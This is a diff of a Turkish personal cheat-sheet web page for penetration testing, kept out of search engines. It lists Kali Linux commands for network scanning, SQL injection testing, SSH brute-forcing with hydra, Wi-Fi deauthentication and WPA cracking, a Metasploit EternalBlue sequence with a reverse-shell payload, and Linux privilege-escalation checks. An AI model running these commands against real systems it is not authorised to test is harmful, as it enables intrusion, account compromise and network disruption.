@@ -5,87 +5,141 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>CyberTools – Kişisel Siber Güvenlik Notları</title>
   <link rel="stylesheet" href="css/style.css" />
-  <meta name="robots" content="noindex, nofollow"> <!-- Google’dan gizli -->
+  <meta name="robots" content="noindex, nofollow">
 </head>
 <body>
 
   <section class="gray-box" style="margin-top: 100px;">
     <h2 class="neon-text">CyberTools – Kişisel Siber Güvenlik Ajandası</h2>
-    <p>Bu sayfa yalnızca sana özeldir dostum. Tüm sızma test araçları, Kali Linux komutları ve kendi not kutun bu sayfada yer alır.</p>
+    <p>Bu sayfa yalnızca sana özeldir can dostum. Tüm sızma test araçları, Kali komutları, özel saldırı adımları ve not kutun bu sayfada yer alır.</p>
 
     <hr>
     <h3>1. Ağ Keşif ve Bilgi Toplama</h3>
     <ul>
-      <li><strong>ifconfig</strong> – IP adresi ve ağ arabirimlerini gösterir<br><code>ifconfig</code></li>
-      <li><strong>netdiscover</strong> – Ağdaki cihazları keşfeder<br><code>netdiscover -r 192.168.1.0/24</code></li>
-      <li><strong>whois</strong>, <strong>dig</strong>, <strong>nslookup</strong> – DNS ve domain bilgi toplama</li>
+      <li><strong>netdiscover</strong> – ➤ Yerel ağdaki aktif cihazları MAC adresleriyle keşfeder.  
+        <br><code>netdiscover -r 192.168.1.0/24</code></li>
+      <li><strong>arp-scan</strong> – ➤ ARP protokolü ile fiziksel cihazları listeler.  
+        <br><code>arp-scan -l</code></li>
+      <li><strong>whois / dig / nslookup</strong> – ➤ Alan adı ve DNS sorguları için kullanılır.</li>
     </ul>
 
     <hr>
     <h3>2. Port Tarama & Servis Keşfi</h3>
     <ul>
-      <li><strong>nmap</strong> – Port tarama<br><code>nmap -sS -T4 192.168.1.1</code></li>
-      <li><strong>masscan</strong> – Hızlı port tarama<br><code>masscan 192.168.1.0/24 -p80</code></li>
+      <li><strong>nmap</strong> – ➤ Hedef IP’deki açık portları ve servisleri tespit eder.  
+        <br><code>nmap -sS -T4 192.168.1.1</code></li>
+      <li><strong>masscan</strong> – ➤ Geniş ağları çok hızlı taramak için kullanılır.  
+        <br><code>masscan 192.168.1.0/24 -p80</code></li>
     </ul>
 
     <hr>
-    <h3>3. Web Uygulama Test Araçları</h3>
+    <h3>3. Web Uygulama Sızma Testi</h3>
     <ul>
-      <li><strong>sqlmap</strong> – SQL Injection testi<br><code>sqlmap -u "http://site.com/page.php?id=1" --dbs</code></li>
-      <li><strong>gobuster</strong> – Dizin brute-force<br><code>gobuster dir -u http://site.com -w /wordlist.txt</code></li>
-      <li><strong>nikto</strong> – Web sunucusu zafiyet tarayıcı</li>
+      <li><strong>sqlmap</strong> – ➤ Otomatik SQL Injection testi yapar.  
+        <br><code>sqlmap -u "http://site.com/page.php?id=1" --dbs</code></li>
+      <li><strong>gobuster</strong> – ➤ Dizin ve dosya keşfi yapar.  
+        <br><code>gobuster dir -u http://site.com -w /usr/share/wordlists/dirb/common.txt</code></li>
+      <li><strong>nikto</strong> – ➤ Web sunucusu üzerindeki zafiyetleri tarar.  
+        <br><code>nikto -h http://targetsite.com</code></li>
     </ul>
 
     <hr>
-    <h3>4. Şifre Kırma ve Erişim Testi</h3>
+    <h3>4. Şifre Kırma & Erişim Testi</h3>
     <ul>
-      <li><strong>hydra</strong> – SSH brute-force<br><code>hydra -l admin -P rockyou.txt 192.168.1.1 ssh</code></li>
-      <li><strong>john the ripper</strong> – Hash kırma<br><code>john --wordlist=rockyou.txt hashes.txt</code></li>
+      <li><strong>hydra</strong> – ➤ SSH, FTP gibi servislerde parola denemesi yapar.  
+        <br><code>hydra -l admin -P rockyou.txt 192.168.1.1 ssh</code></li>
+      <li><strong>john</strong> – ➤ Hash dosyalarındaki şifreleri wordlist ile kırar.  
+        <br><code>john --wordlist=rockyou.txt hashes.txt</code></li>
     </ul>
 
     <hr>
-    <h3>5. Kablosuz Ağ Saldırıları</h3>
+    <h3>5. Kablosuz Ağ Saldırı Komutları</h3>
     <ul>
-      <li><strong>airmon-ng</strong> – Monitor moda geç<br><code>airmon-ng start wlan0</code></li>
-      <li><strong>airodump-ng</strong> – Ağları keşfet<br><code>airodump-ng wlan0mon</code></li>
-      <li><strong>aireplay-ng</strong> – Deauth saldırısı<br><code>aireplay-ng -0 10 -a [BSSID] wlan0mon</code></li>
-      <li><strong>aircrack-ng</strong> – WPA handshake kır<br><code>aircrack-ng -w rockyou.txt dump.cap</code></li>
+      <li><strong>airmon-ng</strong> – ➤ Kablosuz kartı izleme moduna alır.  
+        <br><code>airmon-ng start wlan0</code></li>
+      <li><strong>airodump-ng</strong> – ➤ Çevredeki ağları ve bağlı cihazları analiz eder.  
+        <br><code>airodump-ng wlan0mon</code></li>
+      <li><strong>aireplay-ng</strong> – ➤ Hedeften istemci düşürme (deauth attack) yapar.  
+        <br><code>aireplay-ng -0 10 -a [BSSID] wlan0mon</code></li>
+      <li><strong>aircrack-ng</strong> – ➤ Elde edilen handshake’i kullanarak WPA şifresi kırar.  
+        <br><code>aircrack-ng -w rockyou.txt dump.cap</code></li>
     </ul>
 
     <hr>
-    <h3>6. Metasploit Kullanımı</h3>
+    <h3>6. Metasploit Framework</h3>
     <ul>
-      <li><code>msfconsole</code> – Başlat</li>
-      <li><code>use exploit/windows/smb/ms17_010_eternalblue</code> – Exploit seç</li>
-      <li><code>set RHOSTS 192.168.1.10</code> – Hedef belirle</li>
-      <li><code>set PAYLOAD windows/meterpreter/reverse_tcp</code> – Payload seç</li>
-      <li><code>set LHOST 192.168.1.5</code> – Saldırgan IP</li>
-      <li><code>exploit</code> – Çalıştır</li>
+      <li><strong>msfconsole</strong> – ➤ Otomatik exploit ve payload kullanımına olanak sağlar.  
+        <br><code>use exploit/... → set RHOSTS → set PAYLOAD → set LHOST → exploit</code></li>
     </ul>
 
     <hr>
-    <h3>7. Exploit Veritabanı</h3>
+    <h3>7. Exploit Veritabanı & Searchsploit</h3>
     <ul>
-      <li><code>searchsploit wordpress</code> – Exploit araması</li>
-      <li><code>searchsploit -x path/to/exploit</code> – Detay görüntüle</li>
-      <li><code>searchsploit -u</code> – Güncelle</li>
+      <li><strong>searchsploit</strong> – ➤ Exploit-DB’den hedef yazılıma ait zafiyetleri listeler.  
+        <br><code>searchsploit wordpress</code></li>
+      <li><strong>-x</strong> – ➤ Exploit dosyasını aç.  
+        <br><code>searchsploit -x [path]</code></li>
+      <li><strong>-u</strong> – ➤ Exploit-DB’yi güncelle.  
+        <br><code>searchsploit -u</code></li>
     </ul>
 
     <hr>
     <h3>8. Privilege Escalation (Linux)</h3>
     <ul>
-      <li><code>sudo -l</code> – Sudo izinlerini göster</li>
-      <li><code>find / -perm -4000 2>/dev/null</code> – SUID dosyaları</li>
-      <li><code>uname -a</code> + <code>searchsploit kernel</code> – Kernel exploit kontrolü</li>
-      <li><code>./linpeas.sh</code> – Otomatik privesc aracı</li>
+      <li><strong>sudo -l</strong> – ➤ Yetkili çalıştırılabilir komutları listeler.  
+        <br><code>sudo -l</code></li>
+      <li><strong>find / -perm -4000</strong> – ➤ SUID bitli dosyaları arar.  
+        <br><code>find / -perm -4000 2>/dev/null</code></li>
+      <li><strong>linpeas</strong> – ➤ Otomatik yerel zafiyet taraması yapar.  
+        <br><code>./linpeas.sh</code></li>
     </ul>
 
     <hr>
-    <h3>9. Kendi Notlarım</h3>
-    <textarea rows="10" placeholder="Buraya kendi hedef IP'lerini, özel komutlarını, notlarını yazabilirsin..." style="width: 100%; border-radius: 8px; padding: 10px; background-color: rgba(255,255,255,0.05); color: #e0e0e0; border: none;"></textarea>
+    <h3>9. OSINT Araçları</h3>
+    <ul>
+      <li><strong>theHarvester</strong> – ➤ Alan adı üzerinden e-posta, alt domain ve IP bilgisi toplar.  
+        <br><code>theHarvester -d domain.com -b google</code></li>
+      <li><strong>Maltego</strong> – ➤ Görsel OSINT analiz aracıdır.  
+        <br><i>(Grafik arayüzlü çalışır)</i></li>
+    </ul>
 
-    <p style="margin-top: 20px; font-style: italic;">Bu sayfa sana özeldir. Menüde görünmez, arama motorları tarafından indekslenmez. Lütfen bağlantısını paylaşma.</p>
+    <hr>
+    <h3>10. Ağa Özel Bilgi Toplama</h3>
+    <ul>
+      <li><strong>nmap -O</strong> – ➤ Hedef sistemin işletim sistemini tahmin eder.  
+        <br><code>nmap -O 192.168.1.1</code></li>
+      <li><strong>nmap --script vuln</strong> – ➤ Bilinen zafiyetleri tespit etmek için kullanılır.  
+        <br><code>nmap --script vuln 192.168.1.1</code></li>
+      <li><strong>traceroute</strong> – ➤ Ağda hedefe giden rotayı listeler.  
+        <br><code>traceroute 8.8.8.8</code></li>
+      <li><strong>snmpwalk</strong> – ➤ SNMP destekli cihazdan veri çeker.  
+        <br><code>snmpwalk -v2c -c public 192.168.1.1</code></li>
+    </ul>
+
+    <hr>
+    <h3>11. Kablosuz Ağa Özel Bilgi Toplama (airodump-ng)</h3>
+    <ul>
+      <li><strong>Monitor moda geç:</strong><br><code>airmon-ng start wlan0</code></li>
+      <li><strong>Tüm ağları gör:</strong><br><code>airodump-ng wlan0mon</code></li>
+      <li><strong>Hedef ağa odaklan:</strong><br><code>airodump-ng --bssid [BSSID] -c [kanal] -w dump wlan0mon</code></li>
+      <li><strong>WPA kırma:</strong><br><code>aircrack-ng -w rockyou.txt dump.cap</code></li>
+    </ul>
+
+    <hr>
+    <h3>12. Kendi Notlarım</h3>
+    <textarea id="notlar" rows="10" placeholder="Buraya özel notlarını yaz..." style="width: 100%; border-radius: 8px; padding: 10px; background-color: rgba(255,255,255,0.05); color: #e0e0e0; border: none;"></textarea>
+
+    <p style="margin-top: 20px; font-style: italic;">Bu sayfa sana özeldir. Menüde yoktur, Google’da çıkmaz. Sadece senin dijital siber ajandandır.</p>
   </section>
+
+  <!-- Notları localStorage'a kaydetme -->
+  <script>
+    const notKutusu = document.getElementById("notlar");
+    notKutusu.value = localStorage.getItem("siberNotlar") || "";
+    notKutusu.addEventListener("input", () => {
+      localStorage.setItem("siberNotlar", notKutusu.value);
+    });
+  </script>
 
 </body>
 </html>
